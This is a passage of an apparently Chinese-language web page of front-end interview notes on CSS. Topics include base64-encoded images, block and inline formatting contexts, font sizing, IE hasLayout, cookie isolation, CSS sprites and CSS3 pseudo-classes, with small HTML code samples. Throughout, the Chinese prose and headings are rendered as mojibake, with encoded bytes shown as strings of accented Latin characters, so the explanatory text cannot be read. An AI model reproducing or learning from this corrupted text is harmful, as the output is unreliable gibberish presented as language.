çš„æ‰€æœ‰è§£æå’Œæ¸²æŸ“è¡¨ç°å°±å¦‚åŒæ¯ä¸ªè¡Œæ¡†ç›’å­çš„å‰é¢æœ‰ä¸€ä¸ªâ€œç©ºç™½èŠ‚ç‚¹â€ä¸€æ ·ã€‚è¿™ä¸ªâ€œç©ºç™½èŠ‚ç‚¹â€æ°¸è¿œé€æ˜ï¼Œä¸å æ®ä»»ä½•å®½åº¦ï¼Œçœ‹ä¸è§ä¹Ÿæ— æ³•é€šè¿‡è„šæœ¬è·å–ï¼Œå°±å¥½åƒå¹½çµä¸€æ ·ï¼Œä½†åˆç¡®ç¡®å®å®åœ°å­˜åœ¨ï¼Œè¡¨ç°å¦‚åŒæ–‡æœ¬èŠ‚ç‚¹ä¸€æ ·ï¼Œå› æ­¤ï¼Œæˆ‘ç§°ä¹‹ä¸ºâ€œå¹½çµç©ºç™½èŠ‚ç‚¹â€ã€‚</p><h2 id="ç®€å•ä»‹ç»ä½¿ç”¨å›¾ç‰‡-base64-ç¼–ç çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚"><a href="#ç®€å•ä»‹ç»ä½¿ç”¨å›¾ç‰‡-base64-ç¼–ç çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚" class="headerlink" title="ç®€å•ä»‹ç»ä½¿ç”¨å›¾ç‰‡ base64 ç¼–ç çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚"></a>ç®€å•ä»‹ç»ä½¿ç”¨å›¾ç‰‡ base64 ç¼–ç çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚</h2><p>base64ç¼–ç æ˜¯ä¸€ç§å›¾ç‰‡å¤„ç†æ ¼å¼ï¼Œé€šè¿‡ç‰¹å®šçš„ç®—æ³•å°†å›¾ç‰‡ç¼–ç æˆä¸€é•¿ä¸²å­—ç¬¦ä¸²ï¼Œåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œå¯ä»¥ç”¨è¯¥å­—ç¬¦ä¸²æ¥ä»£æ›¿å›¾ç‰‡çš„urlå±æ€§ã€‚</p><p>ä½¿ç”¨base64çš„ä¼˜ç‚¹æ˜¯ï¼š</p><p>ï¼ˆ1ï¼‰å‡å°‘ä¸€ä¸ªå›¾ç‰‡çš„HTTPè¯·æ±‚</p><p>ä½¿ç”¨base64çš„ç¼ºç‚¹æ˜¯ï¼š</p><p>ï¼ˆ1ï¼‰æ ¹æ®base64çš„ç¼–ç åŸç†ï¼Œç¼–ç åçš„å¤§å°ä¼šæ¯”åŸæ–‡ä»¶å¤§å°å¤§1/3ï¼Œå¦‚æœæŠŠå¤§å›¾ç‰‡ç¼–ç åˆ°html/cssä¸­ï¼Œä¸ä»…ä¼šé€ æˆæ–‡ä»¶ä½“ç§¯çš„å¢åŠ ï¼Œå½±å“æ–‡ä»¶çš„åŠ è½½é€Ÿåº¦ï¼Œè¿˜ä¼šå¢åŠ æµè§ˆå™¨å¯¹htmlæˆ–cssæ–‡ä»¶è§£ææ¸²æŸ“çš„æ—¶é—´ã€‚</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨base64æ— æ³•ç›´æ¥ç¼“å­˜ï¼Œè¦ç¼“å­˜åªèƒ½ç¼“å­˜åŒ…å«base64çš„æ–‡ä»¶ï¼Œæ¯”å¦‚HTMLæˆ–è€…CSSï¼Œè¿™ç›¸æ¯”åŸŸç›´æ¥ç¼“å­˜å›¾ç‰‡çš„æ•ˆæœè¦å·®å¾ˆå¤šã€‚</p><p>ï¼ˆ3ï¼‰å…¼å®¹æ€§çš„é—®é¢˜ï¼Œie8ä»¥å‰çš„æµè§ˆå™¨ä¸æ”¯æŒã€‚</p><p>ä¸€èˆ¬ä¸€äº›ç½‘ç«™çš„å°å›¾æ ‡å¯ä»¥ä½¿ç”¨base64å›¾ç‰‡æ¥å¼•å…¥ã€‚</p><h2 id="å¯¹-BFC-çš„ç†è§£ï¼Ÿ"><a href="#å¯¹-BFC-çš„ç†è§£ï¼Ÿ" class="headerlink" title="å¯¹ BFC çš„ç†è§£ï¼Ÿ"></a>å¯¹ BFC çš„ç†è§£ï¼Ÿ</h2><p>å‚è€ƒè‡ª<a href="https://zhuanlan.zhihu.com/p/25321647">10 åˆ†é’Ÿç†è§£ BFC åŸç†</a></p><p>å—æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼ˆBlock Formatting Contextï¼ŒBFCï¼‰ã€‚<strong>å…·æœ‰ BFC ç‰¹æ€§çš„å…ƒç´ å¯ä»¥çœ‹ä½œæ˜¯éš”ç¦»äº†çš„ç‹¬ç«‹å®¹å™¨ï¼Œå®¹å™¨é‡Œé¢çš„å…ƒç´ ä¸ä¼šåœ¨å¸ƒå±€ä¸Šå½±å“åˆ°å¤–é¢çš„å…ƒç´ ï¼Œå¹¶ä¸” BFC å…·æœ‰æ™®é€šå®¹å™¨æ‰€æ²¡æœ‰çš„ä¸€äº›ç‰¹æ€§ã€‚</strong></p><p>é€šä¿—ä¸€ç‚¹æ¥è®²ï¼Œå¯ä»¥æŠŠ BFC ç†è§£ä¸ºä¸€ä¸ªå°é—­çš„å¤§ç®±å­ï¼Œç®±å­å†…éƒ¨çš„å…ƒç´ æ— è®ºå¦‚ä½•ç¿»æ±Ÿå€’æµ·ï¼Œéƒ½ä¸ä¼šå½±å“åˆ°å¤–éƒ¨ã€‚</p><p>åˆ›å»ºBFC</p><p>ï¼ˆ1ï¼‰æ ¹å…ƒç´ æˆ–åŒ…å«æ ¹å…ƒç´ çš„å…ƒç´ <br>ï¼ˆ2ï¼‰æµ®åŠ¨å…ƒç´ ï¼šfloat é™¤ none ä»¥å¤–çš„å€¼<br>ï¼ˆ3ï¼‰ç»å¯¹å®šä½å…ƒç´ ï¼šposition (absoluteã€fixed)<br>ï¼ˆ4ï¼‰display ä¸º inline-blockã€table-cellsã€flex<br>ï¼ˆ5ï¼‰overflow é™¤äº† visible ä»¥å¤–çš„å€¼ (hiddenã€autoã€scroll)</p><p>ä¸€ä¸ªå…ƒç´ å½¢æˆäº†BFCä¹‹åï¼Œé‚£ä¹ˆå®ƒå†…éƒ¨å…ƒç´ äº§ç”Ÿçš„å¸ƒå±€ä¸ä¼šå½±å“åˆ°å¤–éƒ¨å…ƒç´ ï¼Œå¤–éƒ¨å…ƒç´ çš„å¸ƒå±€ä¹Ÿä¸ä¼šå½±å“åˆ°BFCä¸­çš„å†…éƒ¨å…ƒç´ ã€‚ä¸€ä¸ªBFCå°±åƒæ˜¯ä¸€ä¸ªéš”ç¦»åŒºåŸŸï¼Œå’Œå…¶ä»–åŒºåŸŸäº’ä¸å½±å“ã€‚</p><p>ä¸€èˆ¬æ¥è¯´æ ¹å…ƒç´ æ˜¯ä¸€ä¸ªBFCåŒºåŸŸï¼Œæµ®åŠ¨å’Œç»å¯¹å®šä½çš„å…ƒç´ ä¹Ÿä¼šå½¢æˆBFCï¼Œdisplayå±æ€§çš„å€¼ä¸ºinline-blockã€flexè¿™äº›å±æ€§æ—¶ä¹Ÿä¼šåˆ›å»ºBFCã€‚è¿˜æœ‰å°±æ˜¯å…ƒç´ çš„overflowçš„å€¼ä¸ä¸ºvisibleæ—¶éƒ½ä¼šåˆ›å»ºBFCã€‚</p><h3 id="BFC-ç‰¹æ€§åŠåº”ç”¨"><a href="#BFC-ç‰¹æ€§åŠåº”ç”¨" class="headerlink" title="BFC ç‰¹æ€§åŠåº”ç”¨"></a>BFC ç‰¹æ€§åŠåº”ç”¨</h3><p><strong>1. åŒä¸€ä¸ª BFC ä¸‹å¤–è¾¹è·ä¼šå‘ç”ŸæŠ˜å </strong></p><p>ä¸¤ä¸ª div å…ƒç´ éƒ½å¤„äºåŒä¸€ä¸ª BFC å®¹å™¨æ—¶ ( body å…ƒç´ ) ï¼Œç¬¬ä¸€ä¸ª div çš„ä¸‹è¾¹è·å’Œç¬¬äºŒä¸ª div çš„ä¸Šè¾¹è·ä¼šå‘ç”Ÿé‡å ï¼Œæ‰€ä»¥ä¸¤ä¸ªç›’å­ä¹‹é—´è·ç¦»åªæœ‰ 100pxï¼Œè€Œä¸æ˜¯ 200pxã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºä¸€ç§è§„èŒƒï¼š<strong>å¦‚æœæƒ³è¦é¿å…å¤–è¾¹è·çš„é‡å ï¼Œå¯ä»¥å°†å…¶æ”¾åœ¨ä¸åŒçš„ BFC å®¹å™¨ä¸­ã€‚</strong></p><p><strong>2. BFC å¯ä»¥åŒ…å«æµ®åŠ¨çš„å…ƒç´ ï¼ˆæ¸…é™¤æµ®åŠ¨ï¼‰</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #000;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/01/wdx4yQJe5EX9nrz.jpg" alt="Snipaste_2021-07-01_11-06-18.jpg"></p><p>ç”±äºå®¹å™¨å†…å…ƒç´ æµ®åŠ¨ï¼Œè„±ç¦»äº†æ–‡æ¡£æµï¼Œæ‰€ä»¥å®¹å™¨åªå‰©ä¸‹ 2px çš„è¾¹è·é«˜åº¦ã€‚å¦‚æœä½¿è§¦å‘å®¹å™¨çš„ BFCï¼Œé‚£ä¹ˆå®¹å™¨å°†ä¼šåŒ…è£¹ç€æµ®åŠ¨å…ƒç´ ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #000;overflow: hidden&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/01/6MftelV2ki9wGco.jpg" alt="Snipaste_2021-07-01_11-07-10.jpg"></p><p><strong>3. BFC å¯ä»¥é˜»æ­¢å…ƒç´ è¢«æµ®åŠ¨å…ƒç´ è¦†ç›–</strong></p><p><img src="https://i.loli.net/2021/07/01/g7Cs5z1SnMOhwfE.jpg" alt="Snipaste_2021-07-01_19-45-07.jpg"></p><p>è¿™é‡Œç¬¬äºŒä¸ªå…ƒç´ æœ‰éƒ¨åˆ†è¢«æµ®åŠ¨å…ƒç´ æ‰€è¦†ç›–ï¼Œ(ä½†æ˜¯æ–‡æœ¬ä¿¡æ¯ä¸ä¼šè¢«æµ®åŠ¨å…ƒç´ æ‰€è¦†ç›–) å¦‚æœæƒ³é¿å…å…ƒç´ è¢«è¦†ç›–ï¼Œå¯è§¦ç¬¬äºŒä¸ªå…ƒç´ çš„ BFC ç‰¹æ€§ï¼Œåœ¨ç¬¬äºŒä¸ªå…ƒç´ ä¸­åŠ å…¥ <strong>overflow: hidden</strong>ï¼Œå°±ä¼šå˜æˆï¼š</p><p><img src="https://i.loli.net/2021/07/01/PC8jTc4J5dOqHIS.jpg" alt="Snipaste_2021-07-01_19-45-44.jpg"></p><p>è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥å®ç°ä¸¤åˆ—è‡ªé€‚åº”å¸ƒå±€ï¼Œæ•ˆæœä¸é”™ï¼Œè¿™æ—¶å€™å·¦è¾¹çš„å®½åº¦å›ºå®šï¼Œå³è¾¹çš„å†…å®¹è‡ªé€‚åº”å®½åº¦(å»æ‰ä¸Šé¢å³è¾¹å†…å®¹çš„å®½åº¦)ã€‚</p><h2 id="IFC-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#IFC-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="IFC æ˜¯ä»€ä¹ˆï¼Ÿ"></a>IFC æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>IFCæŒ‡çš„æ˜¯è¡Œçº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼Œå®ƒæœ‰è¿™æ ·çš„ä¸€äº›å¸ƒå±€è§„åˆ™ï¼š</p><p>ï¼ˆ1ï¼‰è¡Œçº§ä¸Šä¸‹æ–‡å†…éƒ¨çš„ç›’å­ä¼šåœ¨æ°´å¹³æ–¹å‘ï¼Œä¸€ä¸ªæ¥ä¸€ä¸ªåœ°æ”¾ç½®ã€‚<br>ï¼ˆ2ï¼‰å½“ä¸€è¡Œä¸å¤Ÿçš„æ—¶å€™ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ä¸‹ä¸€è¡Œã€‚<br>ï¼ˆ3ï¼‰è¡Œçº§ä¸Šä¸‹æ–‡çš„é«˜åº¦ç”±å†…éƒ¨æœ€é«˜çš„å†…è”ç›’å­çš„é«˜åº¦å†³å®šã€‚</p><h2 id="åœ¨ç½‘é¡µä¸­åº”è¯¥ä½¿ç”¨å¥‡æ•°è¿˜æ˜¯å¶æ•°çš„å­—ä½“ï¼Ÿä¸ºä»€ä¹ˆå‘¢ï¼Ÿ"><a href="#åœ¨ç½‘é¡µä¸­åº”è¯¥ä½¿ç”¨å¥‡æ•°è¿˜æ˜¯å¶æ•°çš„å­—ä½“ï¼Ÿä¸ºä»€ä¹ˆå‘¢ï¼Ÿ" class="headerlink" title="åœ¨ç½‘é¡µä¸­åº”è¯¥ä½¿ç”¨å¥‡æ•°è¿˜æ˜¯å¶æ•°çš„å­—ä½“ï¼Ÿä¸ºä»€ä¹ˆå‘¢ï¼Ÿ"></a>åœ¨ç½‘é¡µä¸­åº”è¯¥ä½¿ç”¨å¥‡æ•°è¿˜æ˜¯å¶æ•°çš„å­—ä½“ï¼Ÿä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å¶æ•°å­—å·ç›¸å¯¹æ›´å®¹æ˜“å’Œwebè®¾è®¡çš„å…¶ä»–éƒ¨åˆ†æ„æˆæ¯”ä¾‹å…³ç³»ã€‚æ¯”å¦‚ï¼šå½“æˆ‘ç”¨äº†14pxçš„æ­£æ–‡å­—å·ï¼Œæˆ‘å¯èƒ½ä¼šåœ¨ä¸€äº›åœ°æ–¹ç”¨14Ã—0.5=7pxçš„marginï¼Œåœ¨å¦ä¸€äº›åœ°æ–¹ç”¨14Ã—1.5=21pxçš„æ ‡é¢˜å­—å·ã€‚<br>ï¼ˆ2ï¼‰æµè§ˆå™¨ç¼˜æ•…ï¼Œä½ç‰ˆæœ¬çš„æµè§ˆå™¨ie6ä¼šæŠŠå¥‡æ•°å­—ä½“å¼ºåˆ¶è½¬åŒ–ä¸ºå¶æ•°ï¼Œå³13pxæ¸²æŸ“ä¸º14pxã€‚<br>ï¼ˆ3ï¼‰ç³»ç»Ÿå·®åˆ«ï¼Œæ—©æœŸçš„Windowsé‡Œï¼Œä¸­æ˜“å®‹ä½“ç‚¹é˜µåªæœ‰12å’Œ14ã€15ã€16pxï¼Œå”¯ç‹¬ç¼ºå°‘13pxã€‚</p><h2 id="å¯¹äº-hasLayout-çš„ç†è§£ï¼Ÿ"><a href="#å¯¹äº-hasLayout-çš„ç†è§£ï¼Ÿ" class="headerlink" title="å¯¹äº hasLayout çš„ç†è§£ï¼Ÿ"></a>å¯¹äº hasLayout çš„ç†è§£ï¼Ÿ</h2><p>hasLayoutæ˜¯IEç‰¹æœ‰çš„ä¸€ä¸ªå±æ€§ã€‚å¾ˆå¤šçš„IEä¸‹çš„css bugéƒ½ä¸å…¶æ¯æ¯ç›¸å…³ã€‚åœ¨IEä¸­ï¼Œä¸€ä¸ªå…ƒç´ è¦ä¹ˆè‡ªå·±å¯¹è‡ªèº«çš„å†…å®¹è¿›è¡Œè®¡ç®—å¤§å°å’Œç»„ç»‡ï¼Œè¦ä¹ˆä¾èµ–äºçˆ¶å…ƒç´ æ¥è®¡ç®—å°ºå¯¸å’Œç»„ç»‡å†…å®¹ã€‚å½“ä¸€ä¸ªå…ƒç´ çš„hasLayoutå±æ€§å€¼ä¸ºtrueæ—¶ï¼Œå®ƒè´Ÿè´£å¯¹è‡ªå·±å’Œå¯èƒ½çš„å­å­™å…ƒç´ è¿›è¡Œå°ºå¯¸è®¡ç®—å’Œå®šä½ã€‚è™½ç„¶è¿™æ„å‘³ç€è¿™ä¸ªå…ƒç´ éœ€è¦èŠ±æ›´å¤šçš„ä»£ä»·æ¥ç»´æŠ¤è‡ªèº«å’Œé‡Œé¢çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä¾èµ–äºç¥–å…ˆå…ƒç´ æ¥å®Œæˆè¿™äº›å·¥ä½œã€‚</p><h2 id="å¦‚ä½•è®©å»é™¤-inline-block-å…ƒç´ é—´é—´è·ï¼Ÿ"><a href="#å¦‚ä½•è®©å»é™¤-inline-block-å…ƒç´ é—´é—´è·ï¼Ÿ" class="headerlink" title="å¦‚ä½•è®©å»é™¤ inline-block å…ƒç´ é—´é—´è·ï¼Ÿ"></a>å¦‚ä½•è®©å»é™¤ inline-block å…ƒç´ é—´é—´è·ï¼Ÿ</h2><p>ç§»é™¤ç©ºæ ¼ã€ä½¿ç”¨marginè´Ÿå€¼ã€ä½¿ç”¨font-size:0ã€letter-spacingã€word-spacing</p><h2 id="ä»€ä¹ˆæ˜¯-Cookie-éš”ç¦»ï¼Ÿï¼ˆæˆ–è€…è¯´ï¼šè¯·æ±‚èµ„æºçš„æ—¶å€™ä¸è¦è®©å®ƒå¸¦-cookie-æ€ä¹ˆåšï¼‰"><a href="#ä»€ä¹ˆæ˜¯-Cookie-éš”ç¦»ï¼Ÿï¼ˆæˆ–è€…è¯´ï¼šè¯·æ±‚èµ„æºçš„æ—¶å€™ä¸è¦è®©å®ƒå¸¦-cookie-æ€ä¹ˆåšï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯ Cookie éš”ç¦»ï¼Ÿï¼ˆæˆ–è€…è¯´ï¼šè¯·æ±‚èµ„æºçš„æ—¶å€™ä¸è¦è®©å®ƒå¸¦ cookie æ€ä¹ˆåšï¼‰"></a>ä»€ä¹ˆæ˜¯ Cookie éš”ç¦»ï¼Ÿï¼ˆæˆ–è€…è¯´ï¼šè¯·æ±‚èµ„æºçš„æ—¶å€™ä¸è¦è®©å®ƒå¸¦ cookie æ€ä¹ˆåšï¼‰</h2><p>ç½‘ç«™å‘æœåŠ¡å™¨è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨å¸¦ä¸Šcookieè¿™æ ·å¢åŠ è¡¨å¤´ä¿¡æ¯é‡ï¼Œä½¿è¯·æ±‚å˜æ…¢ã€‚</p><p>å¦‚æœé™æ€æ–‡ä»¶éƒ½æ”¾åœ¨ä¸»åŸŸåä¸‹ï¼Œé‚£é™æ€æ–‡ä»¶è¯·æ±‚çš„æ—¶å€™éƒ½å¸¦æœ‰çš„cookieçš„æ•°æ®æäº¤ç»™serverçš„ï¼Œéå¸¸æµªè´¹æµé‡ï¼Œæ‰€ä»¥ä¸å¦‚éš”ç¦»å¼€ï¼Œé™æ€èµ„æºæ”¾CDNã€‚</p><p>å› ä¸ºcookieæœ‰åŸŸçš„é™åˆ¶ï¼Œå› æ­¤ä¸èƒ½è·¨åŸŸæäº¤è¯·æ±‚ï¼Œæ•…ä½¿ç”¨éä¸»è¦åŸŸåçš„æ—¶å€™ï¼Œè¯·æ±‚å¤´ä¸­å°±ä¸ä¼šå¸¦æœ‰cookieæ•°æ®ï¼Œè¿™æ ·å¯ä»¥é™ä½è¯·æ±‚å¤´çš„å¤§å°ï¼Œé™ä½è¯·æ±‚æ—¶é—´ï¼Œä»è€Œè¾¾åˆ°é™ä½æ•´ä½“è¯·æ±‚å»¶æ—¶çš„ç›®çš„ã€‚</p><p>åŒæ—¶è¿™ç§æ–¹å¼ä¸ä¼šå°†cookieä¼ å…¥WebServerï¼Œä¹Ÿå‡å°‘äº†WebServerå¯¹cookieçš„å¤„ç†åˆ†æç¯èŠ‚ï¼Œæé«˜äº†webserverçš„<br>httpè¯·æ±‚çš„è§£æé€Ÿåº¦ã€‚</p><h2 id="é˜è¿°ä¸€ä¸‹-CSS-Sprites"><a href="#é˜è¿°ä¸€ä¸‹-CSS-Sprites" class="headerlink" title="é˜è¿°ä¸€ä¸‹ CSS Sprites"></a>é˜è¿°ä¸€ä¸‹ CSS Sprites</h2><p>å°†ä¸€ä¸ªé¡µé¢æ¶‰åŠåˆ°çš„æ‰€æœ‰å›¾ç‰‡éƒ½åŒ…å«åˆ°ä¸€å¼ å¤§å›¾ä¸­å»ï¼Œç„¶ååˆ©ç”¨CSSçš„background-imageï¼Œbackground-repeatï¼Œbackground-positionçš„ç»„åˆè¿›è¡ŒèƒŒæ™¯å®šä½ã€‚åˆ©ç”¨CSSSpritesèƒ½å¾ˆå¥½åœ°å‡å°‘ç½‘é¡µçš„httpè¯·æ±‚ï¼Œä»è€Œå¾ˆå¥½çš„æé«˜é¡µé¢çš„æ€§èƒ½ï¼›CSSSpritesèƒ½å‡å°‘å›¾ç‰‡çš„å­—èŠ‚ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>å‡å°‘HTTPè¯·æ±‚æ•°ï¼Œæå¤§åœ°æé«˜é¡µé¢åŠ è½½é€Ÿåº¦</li><li>å¢åŠ å›¾ç‰‡ä¿¡æ¯é‡å¤åº¦ï¼Œæé«˜å‹ç¼©æ¯”ï¼Œå‡å°‘å›¾ç‰‡å¤§å°</li><li>æ›´æ¢é£æ ¼æ–¹ä¾¿ï¼Œåªéœ€åœ¨ä¸€å¼ æˆ–å‡ å¼ å›¾ç‰‡ä¸Šä¿®æ”¹é¢œè‰²æˆ–æ ·å¼å³å¯å®ç°</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>å›¾ç‰‡åˆå¹¶éº»çƒ¦</li><li>ç»´æŠ¤éº»çƒ¦ï¼Œä¿®æ”¹ä¸€ä¸ªå›¾ç‰‡å¯èƒ½éœ€è¦é‡æ–°å¸ƒå±€æ•´ä¸ªå›¾ç‰‡ï¼Œæ ·å¼</li></ul><h2 id="min-width-max-width-å’Œ-min-height-max-height-å±æ€§é—´çš„è¦†ç›–è§„åˆ™ï¼Ÿ"><a href="#min-width-max-width-å’Œ-min-height-max-height-å±æ€§é—´çš„è¦†ç›–è§„åˆ™ï¼Ÿ" class="headerlink" title="min-width/max-width å’Œ min-height/max-height å±æ€§é—´çš„è¦†ç›–è§„åˆ™ï¼Ÿ"></a>min-width/max-width å’Œ min-height/max-height å±æ€§é—´çš„è¦†ç›–è§„åˆ™ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰max-widthä¼šè¦†ç›–widthï¼Œå³ä½¿widthæ˜¯è¡Œç±»æ ·å¼æˆ–è€…è®¾ç½®äº†!importantã€‚</p><p>ï¼ˆ2ï¼‰min-widthä¼šè¦†ç›–max-widthï¼Œæ­¤è§„åˆ™å‘ç”Ÿåœ¨min-widthå’Œmax-widthå†²çªçš„æ—¶å€™ã€‚</p><h2 id="æ— ä¾èµ–ç»å¯¹å®šä½æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ— ä¾èµ–ç»å¯¹å®šä½æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ— ä¾èµ–ç»å¯¹å®šä½æ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ— ä¾èµ–ç»å¯¹å®šä½æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æ²¡æœ‰è®¾ç½®left/top/right/bottomå±æ€§å€¼çš„ç»å¯¹å®šä½ç§°ä¸ºâ€œæ— ä¾èµ–ç»å¯¹å®šä½â€ã€‚</p><p>æ— ä¾èµ–ç»å¯¹å®šä½å…¶å®šä½çš„ä½ç½®å’Œæ²¡æœ‰è®¾ç½®position:absoluteæ—¶å€™çš„ä½ç½®ç›¸å…³ã€‚</p><h2 id="éšè—å…ƒç´ çš„-background-image-åˆ°åº•åŠ ä¸åŠ è½½ï¼Ÿ"><a href="#éšè—å…ƒç´ çš„-background-image-åˆ°åº•åŠ ä¸åŠ è½½ï¼Ÿ" class="headerlink" title="éšè—å…ƒç´ çš„ background-image åˆ°åº•åŠ ä¸åŠ è½½ï¼Ÿ"></a>éšè—å…ƒç´ çš„ background-image åˆ°åº•åŠ ä¸åŠ è½½ï¼Ÿ</h2><p>ä¸€ä¸ªå…ƒç´ å¦‚æœdisplayè®¡ç®—å€¼ä¸ºnoneï¼Œåœ¨IEæµè§ˆå™¨ä¸‹ä¾ç„¶ä¼šå‘é€å›¾ç‰‡è¯·æ±‚ï¼ŒFirefoxæµè§ˆå™¨ä¸ä¼šï¼Œè‡³äºChromeå’ŒSafariæµè§ˆå™¨åˆ™ä¼¼ä¹æ›´åŠ æ™ºèƒ½ä¸€ç‚¹ï¼šå¦‚æœéšè—å…ƒç´ åŒæ—¶åˆè®¾ç½®äº†background-imageï¼Œåˆ™å›¾ç‰‡ä¾ç„¶ä¼šå»åŠ è½½ï¼›å¦‚æœæ˜¯çˆ¶å…ƒç´ çš„displayè®¡ç®—å€¼ä¸ºnoneï¼Œåˆ™èƒŒæ™¯å›¾ä¸ä¼šè¯·æ±‚ï¼Œæ­¤æ—¶æµè§ˆå™¨æˆ–è®¸æ”¾å¿ƒåœ°è®¤ä¸ºè¿™ä¸ªèƒŒæ™¯å›¾æš‚æ—¶æ˜¯ä¸ä¼šä½¿ç”¨çš„ã€‚</p><p>å¦‚æœä¸æ˜¯background-imageï¼Œè€Œæ˜¯<img>å…ƒç´ ï¼Œåˆ™è®¾ç½®display:noneåœ¨æ‰€æœ‰æµè§ˆå™¨ä¸‹ä¾æ—§éƒ½ä¼šè¯·æ±‚å›¾ç‰‡èµ„æºã€‚</p><p>è¿˜éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœè®¾ç½®çš„æ ·å¼æ²¡æœ‰å¯¹åº”çš„å…ƒç´ ï¼Œåˆ™background-imageä¹Ÿä¸ä¼šåŠ è½½ã€‚hoveræƒ…å†µä¸‹çš„background-imageï¼Œåœ¨è§¦å‘æ—¶åŠ è½½ã€‚</p><h1 id="CSS3å†…å®¹"><a href="#CSS3å†…å®¹" class="headerlink" title="CSS3å†…å®¹"></a>CSS3å†…å®¹</h1><h2 id="CSS3æ–°å¢ä¼ªç±»æœ‰é‚£äº›ï¼Ÿ"><a href="#CSS3æ–°å¢ä¼ªç±»æœ‰é‚£äº›ï¼Ÿ" class="headerlink" title="CSS3æ–°å¢ä¼ªç±»æœ‰é‚£äº›ï¼Ÿ"></a>CSS3æ–°å¢ä¼ªç±»æœ‰é‚£äº›ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰elem:nth-child(n)é€‰ä¸­çˆ¶å…ƒç´ ä¸‹çš„ç¬¬nä¸ªå­å…ƒç´ ï¼Œå¹¶ä¸”è¿™ä¸ªå­å…ƒç´ çš„æ ‡ç­¾åä¸ºelemï¼Œnå¯ä»¥æ¥å—å…·ä½“çš„æ•°<br>å€¼ï¼Œä¹Ÿå¯ä»¥æ¥å—å‡½æ•°ã€‚</p><p>ï¼ˆ2ï¼‰elem:nth-last-child(n)ä½œç”¨åŒä¸Šï¼Œä¸è¿‡æ˜¯ä»åå¼€å§‹æŸ¥æ‰¾ã€‚</p><p>ï¼ˆ3ï¼‰elem:last-childé€‰ä¸­æœ€åä¸€ä¸ªå­å…ƒç´ ã€‚</p><p>ï¼ˆ4ï¼‰elem:only-childå¦‚æœelemæ˜¯çˆ¶å…ƒç´ ä¸‹å”¯ä¸€çš„å­å…ƒç´ ï¼Œåˆ™é€‰ä¸­ä¹‹ã€‚</p><p>ï¼ˆ5ï¼‰elem:nth-of-type(n)é€‰ä¸­çˆ¶å…ƒç´ ä¸‹ç¬¬nä¸ªelemç±»å‹å…ƒç´ ï¼Œnå¯ä»¥æ¥å—å…·ä½“çš„æ•°å€¼ï¼Œä¹Ÿå¯ä»¥æ¥å—å‡½æ•°ã€‚</p><p>ï¼ˆ6ï¼‰elem:first-of-typeé€‰ä¸­çˆ¶å…ƒç´ ä¸‹ç¬¬ä¸€ä¸ªelemç±»å‹å…ƒç´ ã€‚</p><p>ï¼ˆ7ï¼‰elem:last-of-typeé€‰ä¸­çˆ¶å…ƒç´ ä¸‹æœ€åä¸€ä¸ªelemç±»å‹å…ƒç´ ã€‚</p><p>ï¼ˆ8ï¼‰elem:only-of-typeå¦‚æœçˆ¶å…ƒç´ ä¸‹çš„å­å…ƒç´ åªæœ‰ä¸€ä¸ªelemç±»å‹å…ƒç´ ï¼Œåˆ™é€‰ä¸­è¯¥å…ƒç´ ã€‚</p><p>ï¼ˆ9ï¼‰elem:emptyé€‰ä¸­ä¸åŒ…å«å­å…ƒç´ å’Œå†…å®¹çš„elemç±»å‹å…ƒç´ ã€‚</p><p>ï¼ˆ10ï¼‰elem:targeté€‰æ‹©å½“å‰æ´»åŠ¨çš„elemå…ƒç´ ã€‚</p><p>ï¼ˆ11ï¼‰:not(elem)é€‰æ‹©éelemå…ƒç´ çš„æ¯ä¸ªå…ƒç´ ã€‚</p><p>ï¼ˆ12ï¼‰:enabled æ§åˆ¶è¡¨å•æ§ä»¶çš„ç¦ç”¨çŠ¶æ€ã€‚</p><p>ï¼ˆ13ï¼‰:disabled    